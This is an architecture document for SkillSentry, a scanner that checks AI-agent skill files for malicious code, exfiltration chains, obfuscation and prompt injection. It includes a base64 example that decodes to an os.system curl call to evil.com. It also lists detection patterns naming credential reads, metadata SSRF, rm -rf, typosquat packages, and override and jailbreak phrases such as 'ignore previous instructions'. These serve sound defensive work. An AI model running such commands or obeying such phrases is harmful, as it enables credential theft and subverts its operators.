# SkillSentry Architecture Document

**Repository:** https://github.com/vythanhtra/skillsentry
**Author:** vythanhtra
**License:** MIT
**Language:** Python (zero external dependencies)
**Requirements:** Python 3.8+

---

## 1. Overview

SkillSentry is an **AI Skill Security Scanner** that detects malicious code, data exfiltration chains, obfuscation techniques, and prompt injection attacks in AI skill files before installation. It targets security vulnerabilities in markdown-based skill files used by AI agents like Claude Code, Cursor, and Antigravity.

The tool examines `.md` skill files through nine detection layers and produces a risk score (0-100) with actionable verdicts. It operates with **zero external dependencies** — pure Python standard library only.

---

## 2. Project Structure

```
skillsentry/
├── SKILL.md                          # Antigravity/Claude Code integration file
├── scripts/
│   └── audit_skill.py                # Core scanning engine (single file)
├── resources/
│   └── rules.yaml                    # Customizable detection rules (25 rules)
├── examples/
│   ├── malicious_skill.md            # Malicious skill test case
│   └── safe_skill.md                 # Safe skill test case
└── .github/
    └── workflows/
        └── test.yml                  # CI/CD automation
```

---

## 3. Detection Layers (9 Layers)

### Layer 1: Unicode Normalization & Evasion Detection

**Function:** `normalize_unicode(text)`

Scans character-by-character to detect:
- **Homoglyph substitution**: Visually identical characters from different scripts (e.g., Cyrillic 'а' masquerading as Latin 'a'). Maintains a mapping dictionary for conversion.
- **Zero-width characters**: Invisible formatting characters (U+200B zero-width space, U+202E right-to-left override) used to hide malicious intent.
- **Keyword splitting**: Detects `b.y.p.a.s.s` → `bypass` style obfuscation via `remove_splitters()`.

All text is normalized before subsequent pattern matching, ensuring obfuscation doesn't bypass detection.

### Layer 2: Code Fence Stripping

**Function:** `strip_code_fences(text)`

Removes markdown/HTML code blocks (` ```python...``` `) while preserving their content. This ensures hidden code inside documentation fences is still scanned by downstream layers.

### Layer 3: Base64 Decode & Scan

**Function:** `decode_base64_blocks(text)`

- Regex identifies 40+ character base64 blocks
- Attempts both standard and URL-safe decoding (with padding correction)
- Calculates printability ratio — must exceed 80% to flag as suspicious
- Cross-references decoded content against ALL action patterns
- Returns suspicious blocks with original (truncated), decoded preview, and matched flags

Example detection:
```
aWYgX19uYW1lX18gPT0gXyJfX21haW5fXyI6CiAgIG9zLnN5c3RlbSgiY...
→ Decodes to: if __name__ == "__main__": os.system("curl https://evil.com")
→ FLAGGED: EXEC_DYNAMIC + NETWORK_SEND
```

### Layer 4: Advanced Obfuscation Detection

Multiple specialized detectors:
- **`detect_rot13()`**: Checks for `codecs.decode('rot13')` or `rot_13` references; attempts ROT13 decoding of entire text to find hidden patterns
- **`detect_xor()`**: Matches byte-level XOR patterns like `chr(ord(c) ^ 42)`
- **`detect_time_bomb()`**: Identifies conditional execution on dates/times (e.g., `datetime.now().day == 25`)
- **`detect_package_poisoning()`**: Detects custom PyPI indices (`--index-url https://malicious.com`) and typosquatting ('requesTs', 'pandaas', 'anthropicc', 'c1aude')

### Layer 5: Behavior Chain Analysis

**Function:** `analyze_behavior_chains(content)`

This is the core intelligence layer. Rather than flagging individual suspicious commands, it detects **attack combinations**:

**Action Patterns (11 types):**

| Pattern | What It Detects |
|---------|----------------|
| `READ_SENSITIVE` | Credential file access (.env, .ssh, API keys) |
| `NETWORK_SEND` | Data exfiltration (curl, wget, requests, sockets) |
| `FILE_DELETE` | Destructive operations (rm -rf, shutil.rmtree) |
| `EXEC_DYNAMIC` | Code execution (eval, exec, subprocess) |
| `WRITE_SYSTEM` | Persistence (cron, bashrc, git hooks) |
| `BASE64_EXEC` | Encoded payloads with immediate decoding/execution |
| `SSRF_METADATA` | Cloud instance metadata endpoints (169.254.169.254) |
| `GIT_HOOK` | Git hook manipulation for backdoors |
| `CLIPBOARD` | Clipboard harvesting utilities |
| `PACKAGE_MOD` | Dependency file modifications |

**Dangerous Chain Definitions (10 chains):**

| Chain | Required Actions | Weight | Severity |
|-------|-----------------|--------|----------|
| Data Exfiltration | READ_SENSITIVE + NETWORK_SEND | 90 | CRITICAL |
| Full Exfil Chain | READ_SENSITIVE + NETWORK_SEND + FILE_DELETE | 100 | CRITICAL |
| Credential Theft | READ_SENSITIVE + EXEC_DYNAMIC | 85 | CRITICAL |
| Backdoor Install | WRITE_SYSTEM + EXEC_DYNAMIC | 80 | HIGH |
| Cloud Metadata SSRF | SSRF_METADATA + NETWORK_SEND | 95 | CRITICAL |

The chain-based approach reduces false positives — a `curl` command alone isn't dangerous, but `curl` combined with `.env` file reading strongly indicates exfiltration.

### Layer 6: Prompt Injection Detection

Eight regex patterns detect manipulation attempts:
- **Instruction override**: "ignore previous instructions", "disregard system prompt"
- **Role delimiter injection**: `<|system|>`, `[SYSTEM]`, `### NEW INSTRUCTIONS`
- **DAN jailbreak**: "do anything now", "unrestricted mode"
- **Roleplay hijacking**: "act as unfiltered assistant"
- **Token smuggling**: "skip to the end"
- **Context window floods**: `repeat × 1000` patterns
- **URL-embedded injection**: Malicious parameters in URLs

Severity ranges from MEDIUM (token smuggling, weight 25) to CRITICAL (delimiter injection, weight 45).

### Layer 7: URL Scanning

**Function:** `scan_urls(content)`

Categorizes all HTTP(S) URLs found:

| Category | Examples | Risk |
|----------|----------|------|
| Shorteners | bit.ly, tinyurl | HIGH — obscured destination |
| IP-based | 192.168.x.x, 10.x.x.x | HIGH — cannot verify legitimacy |
| Hex-encoded | domain.com/%XX%XX | MEDIUM — obfuscated path |
| Trusted | github.com/anthropics, pypi.org | LOW — whitelisted |
| Unknown | Any unrecognized domain | LOW-MEDIUM |

### Layer 8: Risk Scoring

**Function:** `calculate_risk_score()`

Starts at **100 points** (fully safe), deducts for each finding:

```
Base: 100
- Per chain finding:     deduct chain weight (e.g., -90 for exfiltration)
- Per evasion technique: -10 each
- Per injection hit:     deduct weight (-20 to -45)
- Per shortener URL:     -15
- Per IP-based URL:      -20
- Per hex-encoded URL:   -15
- Per unknown domain:    -5
- Per advanced threat:   -15
```

Final score clamped to 0-100 range.

### Layer 9: Real-Time Alerts

Alerts trigger when critical findings are detected (score < 40):

**Discord:**
- Constructs Rich Embed with red (CRITICAL) or yellow (warning) color
- Includes up to 5 chain findings as fields
- Posts via webhook URL

**Telegram:**
- Formats markdown message with skill name, score, risk level
- Sends via Telegram Bot API
- 5-second timeout

---

## 4. Risk Scoring System

| Score | Risk Level | Recommendation |
|-------|-----------|----------------|
| 80-100 | SAFE | Install freely |
| 60-79 | LOW RISK | Review before installing |
| 40-59 | MEDIUM RISK | Detailed audit required |
| 20-39 | HIGH RISK | Do not install |
| 0-19 | CRITICAL | Block immediately |

---

## 5. Custom Rules (`resources/rules.yaml`)

25 built-in rules across 10 categories:

### Data Exfiltration (4 rules)
| Rule | Severity | Weight |
|------|----------|--------|
| `env_file_read` | CRITICAL | 50 |
| `aws_credentials` | CRITICAL | 55 |
| `ssh_private_key` | CRITICAL | 55 |
| `gcp_credentials` | CRITICAL | 55 |

### Cloud Metadata SSRF (3 rules)
| Rule | Severity | Weight |
|------|----------|--------|
| `aws_metadata_ssrf` (169.254.169.254) | CRITICAL | 80 |
| `gcp_metadata_ssrf` | CRITICAL | 80 |
| `azure_metadata_ssrf` | CRITICAL | 80 |

### Network Upload (3 rules)
| Rule | Severity | Weight |
|------|----------|--------|
| `multipart_upload` | HIGH | 30 |
| `websocket_exfil` | MEDIUM | 20 |
| `dns_exfil` | MEDIUM | 15 |

### Obfuscation & Evasion (5 rules)
| Rule | Severity | Weight |
|------|----------|--------|
| `rot13_obfuscation` | HIGH | 35 |
| `hex_string_decode` | MEDIUM | 25 |
| `chr_concat_bypass` | HIGH | 40 |
| `xor_obfuscation` | HIGH | 40 |
| `unicode_rtlo` | CRITICAL | 70 |

### Persistence (3 rules)
| Rule | Severity | Weight |
|------|----------|--------|
| `cron_write` | CRITICAL | 60 |
| `startup_write` | CRITICAL | 60 |
| `git_hook_inject` | CRITICAL | 65 |

### Other Categories
| Rule | Category | Severity | Weight |
|------|----------|----------|--------|
| `self_destruct` | Self-Destruct | CRITICAL | 80 |
| `time_bomb` | Time-Bomb | MEDIUM | 25 |
| `custom_package_index` | Supply Chain | CRITICAL | 70 |
| `npm_custom_registry` | Supply Chain | CRITICAL | 70 |
| `clipboard_read` | Privacy | HIGH | 45 |
| `hidden_html_instructions` | Injection | CRITICAL | 50 |

All rules are enabled by default with configurable severity overrides.

---

## 6. End-to-End Scanning Pipeline

```
Input File (.md skill)
         │
         ▼
┌────────────────────────────┐
│  Load & Validate File      │
│  (UTF-8, error tolerant)   │
└──────────┬─────────────────┘
           ▼
┌────────────────────────────┐
│  Unicode Normalization     │
│  (homoglyphs, zero-width)  │
└──────────┬─────────────────┘
           ▼
┌────────────────────────────┐
│  Strip Code Fences         │
│  (preserve inner content)  │
└──────────┬─────────────────┘
           ▼
┌──────────┴─────────────────────────────────────┐
│                                                │
▼                                                ▼
┌──────────────────┐     ┌─────────────────────────┐
│ Base64 Decode    │     │ Action Pattern Matching  │
│ & Scan           │     │ (11 pattern types)       │
└────────┬─────────┘     └───────────┬─────────────┘
         │                           ▼
         │               ┌─────────────────────────┐
         │               │ Behavior Chain Analysis  │
         │               │ (10 chain definitions)   │
         │               └───────────┬─────────────┘
         ▼                           ▼
┌──────────────────┐     ┌─────────────────────────┐
│ Advanced Obfusc. │     │ Prompt Injection Scan    │
│ (ROT13, XOR,     │     │ (8 injection patterns)   │
│  time-bombs,     │     └───────────┬─────────────┘
│  typosquatting)  │                 │
└────────┬─────────┘                 │
         │                           │
         ▼                           ▼
┌──────────────────┐     ┌─────────────────────────┐
│ URL Scanning     │     │ Custom Rules Match       │
│ (categorize)     │     │ (rules.yaml, 25 rules)   │
└────────┬─────────┘     └───────────┬─────────────┘
         │                           │
         └─────────┬─────────────────┘
                   ▼
         ┌─────────────────┐
         │  Risk Scoring   │
         │  (100 - penalties)│
         └────────┬────────┘
                  ▼
         ┌─────────────────┐
         │  Report Output  │
         │  (Console/JSON) │
         └────────┬────────┘
                  ▼
         ┌─────────────────┐
         │  Send Alerts    │
         │  (if score < 40)│
         │  Discord/Telegram│
         └─────────────────┘
```

---

## 7. CLI Interface

### Commands

```bash
# Single file audit
python scripts/audit_skill.py path/to/SKILL.md

# Batch audit (all skills in default directories)
python scripts/audit_skill.py --all

# JSON output for programmatic use
python scripts/audit_skill.py SKILL.md --json > report.json

# With Discord alerts
python scripts/audit_skill.py --all --discord "https://discord.com/api/webhooks/..."

# With Telegram alerts
python scripts/audit_skill.py --all --telegram "BOT_TOKEN:CHAT_ID"
```

### Arguments

| Argument | Description |
|----------|-------------|
| `files` | Single file or directory path (recursive glob for .md) |
| `--all` | Scan default skill directories (~/.gemini/antigravity/scratch/.agent/skills) |
| `--json` | Output JSON instead of formatted text |
| `--discord URL` | Enable Discord webhook alerts |
| `--telegram TOKEN:CHAT_ID` | Enable Telegram bot alerts |

---

## 8. Integration with AI Agents

SkillSentry ships a `SKILL.md` file that enables integration with Antigravity and Claude Code agent systems. When installed as a skill, users can invoke it through natural language commands or the `/skillsentry` slash command, making security audits accessible directly within the AI coding workflow.

The tool is designed to scan the same `.md` skill files that these agent systems consume, creating a security-first workflow: **scan before install**.

---

## 9. Design Patterns and Technical Decisions

### Zero Dependencies
The entire scanner runs on Python standard library only. This is a deliberate security decision — no supply chain risk from third-party packages, and trivial to audit the entire codebase.

### Single-File Engine
The core scanner (`audit_skill.py`) is a single Python file. This makes it easy to embed, distribute, and audit. No complex module structure to navigate.

### Defense in Depth
Nine detection layers ensure that sophisticated attacks must evade multiple independent detection mechanisms. Unicode normalization happens before pattern matching, so obfuscation is stripped before behavioral analysis runs.

### Chain-Based Detection Over Pattern Matching
Instead of flagging individual suspicious commands (which produces many false positives), SkillSentry looks for **combinations** of actions that together form attack patterns. `curl` alone is benign; `curl` after reading `.env` files is data exfiltration.

### Subtractive Scoring
Starting at 100 and deducting provides intuitive risk assessment — the more issues found, the lower the score. Weights are calibrated so that a single critical chain (e.g., full exfiltration) drops the score below the "do not install" threshold.

### Deobfuscation-First Pipeline
All text normalization (unicode, base64 decoding, code fence stripping) happens before pattern matching. This architectural decision ensures that obfuscation techniques don't bypass downstream detection layers.

---

## 10. Comparison with PromptForest

| Aspect | SkillSentry | PromptForest |
|--------|-------------|--------------|
| **Focus** | Skill file security scanning | Prompt injection detection |
| **Approach** | Rule-based + chain analysis | ML ensemble (3 models) |
| **Dependencies** | Zero (pure Python) | Heavy (PyTorch, transformers, XGBoost) |
| **What It Scans** | Markdown skill files for malicious code | User prompts for injection attacks |
| **Output** | Risk score 0-100 + detailed findings | Malicious probability + confidence |
| **Deployment** | CLI script | CLI + HTTP server |
| **False Positive Strategy** | Chain-based (require action combos) | Ensemble disagreement (uncertainty metric) |
